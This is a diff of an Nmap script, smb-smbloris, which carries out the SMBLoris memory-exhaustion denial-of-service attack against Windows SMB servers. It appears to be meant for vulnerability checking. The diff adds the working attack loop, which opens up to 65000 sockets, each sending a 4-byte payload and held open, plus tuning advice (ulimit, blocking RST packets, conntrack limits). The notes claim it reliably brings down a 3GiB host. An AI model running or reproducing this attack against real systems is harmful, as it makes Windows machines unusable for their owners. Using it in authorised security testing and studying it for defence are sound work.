@@ -13,16 +13,71 @@ As of 8 Aug 2017, there has been no plans to patch this.
 This script is based off the script used by zerosum0x0 in his original
 demonstration at DEFCON, which was released to public in a PR on Metasploit.
 
+To use the script, you need to make sure that your <code>ulimit -n</code> is
+at least 65535. You may also need iptables to block outbound RST packets.
+Increasing the local conntrack limit may also help, i.e.
+<code> echo 1200000 > /proc/sys/net/netfilter/nf_conntrack_max </code> The
+network quality is also important to the success of the script as the ports
+connect to the host synchronously.
+
+Due to certain limitations which exact cause cannot be determined, there may
+be a limit on the amount of sockets that can be maintained at any given time.
+You may not get the full 8GiB per IP. The script has been tested to reliably
+bring down a host with 3GiB of RAM.
+
+Improvements to the script can look at making it asynchronous. Attempts have
+been made, but because of the above limitations, results may vary.
+
 References:
 * http://smbloris.com/
 * https://github.com/rapid7/metasploit-framework/pull/8796
+* https://gist.github.com/marcan/6a2d14b0e3eaa5de1795a763fb58641e
 ]]
 ---
---@usage
+-- @usage nmap --script smb-smbloris 192.168.15.155 -p445 --min-rate=10000
 --
---@output
+-- @output
+-- PORT    STATE SERVICE      REASON
+-- 445/tcp open  microsoft-ds syn-ack ttl 128
+-- MAC Address: 00:0C:29:29:B7:E0 (VMware)
+--
+-- | smb-smbloris:
+-- |   VULNERABLE:
+-- |   Denial of service attack against Microsoft Windows SMB servers (SMBLoris)
+-- |     State: VULNERABLE
+-- |     Risk factor: HIGH  CVSSv3: 7.8 (HIGH) (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H/E:F/RL:W/RC:C)
+-- |       All modern versions of Windows, at least from Windows 2000 through Windows 10, are vulnerable to a remote and uncredentialed denial of service attack. The attacker can allocate large amounts of memory remotely by sending a payload from multiple sockets from unique sockets, rendering vulnerable machines completely unusable.
+-- |
+-- |     Disclosure date: 2017-08-1
+-- |     References:
+-- |_      http://smbloris.com/
 --
 -- @xmloutput
+-- <script id="smb-smbloris" output="&#xa;  VULNERABLE:&#xa;  Denial of service attack against Microsoft Windows SMB servers (SMBLoris)&#xa;    State: VULNERABLE&#xa;    Risk factor: HIGH  CVSSv3: 7.8 (HIGH) (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H/E:F/RL:W/RC:C)&#xa;      All modern versions of Windows, at least from Windows 2000 through Windows 10, are vulnerable to a remote and uncredentialed denial of service attack. The attacker can allocate large amounts of memory remotely by sending a payload from multiple sockets from unique sockets, rendering vulnerable machines completely unusable.&#xa;      &#xa;    Disclosure date: 2017-08-1&#xa;    References:&#xa;      http://smbloris.com/&#xa;"><table key="NMAP-1">
+-- <elem key="title">Denial of service attack against Microsoft Windows SMB servers (SMBLoris)</elem>
+-- <elem key="state">VULNERABLE</elem>
+-- <table key="scores">
+-- <elem key="CVSSv3">7.8 (HIGH) (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H/E:F/RL:W/RC:C)</elem>
+-- </table>
+-- <table key="description">
+-- <elem>All modern versions of Windows, at least from Windows 2000 through Windows 10, are vulnerable to a remote and uncredentialed denial of service attack. The attacker can allocate large amounts of memory remotely by sending a payload from multiple sockets from unique sockets, rendering vulnerable machines completely unusable.&#xa;</elem>
+-- </table>
+-- <table key="dates">
+-- <table key="disclosure">
+-- <elem key="month">08</elem>
+-- <elem key="day">1</elem>
+-- <elem key="year">2017</elem>
+-- </table>
+-- </table>
+-- <elem key="disclosure">2017-08-1</elem>
+-- <table key="refs">
+-- <elem>http://smbloris.com/</elem>
+-- </table>
+-- </table>
+-- </script>
+-- @args smb-smbloris.timeout Time in seconds for the script to timeout. Default: 300
+--
+---
 
 author = "Paulino Calderon, Wong Wai Tuck"
 license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
@@ -33,58 +88,158 @@ hostrule = function(host)
 end
 
 local host_down = false
-local TIMEOUT = 30 -- number of seconds to timeout the attack
-local timed_out = false
+local TIMEOUT = 300 -- number of seconds to timeout the attack
+local skts = {} -- prevent garbage collection
+local CRITICAL_VALUE_99 = 2.58
 
-local function set_timeout()
-  stdnse.sleep(TIMEOUT)
-  timed_out = true
+--- calculates the arithmetic mean for time by averaging the values
+--  @param times an array of timings
+--  @return the mean calculated from the array of timings
+local function get_mean(times)
+  local sum = 0
+  for _, time in pairs(times) do
+    sum = sum + time
+  end
+
+  return sum / #times
 end
 
-local function check_alive(host)
+--- calculates the std err for time by finding the variance the taking the sqrt
+--  @param times an array of timings
+--  @return the std err calculated from the array of timings
+local function get_standard_err(times)
+  local mean = get_mean(times)
+
+  local variance = 0
+  for _, time in pairs(times) do
+    variance = variance + math.pow((time - mean), 2)
+  end
+
+  return math.sqrt(variance)
+end
+
+--- calcualates the confidence interval from timings
+--  @param times an array of timings
+--  @return the deviation from the mean signifying the 99% confidence interval
+local function get_ci(times)
+  local std_err = get_standard_err(times)
+  return CRITICAL_VALUE_99 * std_err
+end
+
+local function set_baseline(host)
+  local times = {}
+  -- sample 30 times
+  for i=1, 30, 1 do
+    local start_time = nmap.clock_ms()
+    local status = smb.get_os(host)
+
+    if not status then
+      stdnse.debug1("Error querying SMB through OS, can't determine if host is alive")
+      return nil
+    end
+
+    local end_time = nmap.clock_ms()
+
+    table.insert(times, end_time - start_time)
+  end
+
+  local mean = get_mean(times)
+  local ci = get_ci(times)
+  return mean, ci
+end
+
+
+local function check_alive(host, mean, ci)
+  local start_time = nmap.clock_ms()
   local status = smb.get_os(host)
-  if not status then
+  local end_time = nmap.clock_ms()
+
+  -- if the get_os fails or it exceeds our 99% threshold we are reasonably
+  -- confident that it is vulnerable
+  if not status or (end_time - start_time) - mean > ci then
     host_down = true
   end
 end
 
 local function send_dos(host, port, src_port)
-  if host_down or timed_out then
+  if host_down then
     return
   end
 
+  local oldsocket = skts[src_port]
+  -- the below doesn't work when num ports is at 65000 because
+  -- of some Lua sorcery where the sockets will disappear and have no value
+  if oldsocket then
+    oldsocket:close()
+  end
+
   local socket = nmap.new_socket()
+  socket:set_timeout(86400000) -- one day in milliseconds
 
   local try = nmap.new_try()
+
+  stdnse.debug1("Trying to send from %s", src_port)
 
   try(socket:bind("0.0.0.0", src_port))
   socket:connect(host, port)
   socket:send('\x00\x01\xff\xff')
+  if not oldsocket then
+    table.insert(skts, socket)
+  end
 
-  local status, data = socket:receive()
 end
 
 action = function(host)
   port = smb.get_port(host)
+  local vuln = {
+    title = "Denial of service attack against Microsoft Windows SMB servers (SMBLoris)",
+    risk_factor = "HIGH",
+    scores = {
+      CVSSv3 = "7.8 (HIGH) (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H/E:F/RL:W/RC:C)"
+    },
+    description = [[
+All modern versions of Windows, at least from Windows 2000 through Windows 10, are vulnerable to a remote and uncredentialed denial of service attack. The attacker can allocate large amounts of memory remotely by sending a payload from multiple sockets from unique sockets, rendering vulnerable machines completely unusable.
+]],
+    references = {
+      'http://smbloris.com/',
+    },
+    dates = {
+      disclosure = {year = '2017', month = '08', day = '1'},
+    }
+  }
+  local report = vulns.Report:new(SCRIPT_NAME, host)
+  vuln.state = vulns.STATE.NOT_VULN
+
   local timeout = tonumber(stdnse.get_script_args(SCRIPT_NAME .. '.timeout'))
     or TIMEOUT
-  --local timeout_thread = stdnse.new_thread(set_timeout, timeout)
+  local script_start = nmap.clock()
+  local mean, ci = set_baseline(host)
 
-  while (not timed_out) or (not host_down)  do
-    for i=1, 65535, 1 do
-      local co = stdnse.new_thread(send_dos, host, port, i)
-    end
-    check_alive(host)
+  -- nil means the smb.get_os failed, we return since we cannot check
+  if mean == nil then
+    return
   end
-  -- if vuln, stop the DoS and show vuln to user
+
+  stdnse.debug1("Mean: %s, 99%% interval: ± %s", mean, ci)
+    -- using 65000 instead of 65535 prevents crash of too many files open
+  for i=1, 65000, 1 do
+    send_dos( host, port, i)
+
+    if i % 1000 == 0 and i <= 60000 then
+      -- prevents crash when i >= 61000
+      check_alive(host, mean, ci)
+    end
+
+    -- has it timed out yet?
+    if nmap.clock() - timeout >= script_start then
+      stdnse.debug1("Script timed out at %s", timeout)
+      break
+    end
+  end
 
   if host_down then
-    stdnse.debug1('yay')
+    vuln.state = vulns.STATE.VULN
   end
 
-  return
+  return report:make_output(vuln)
 end
-
-
-
-
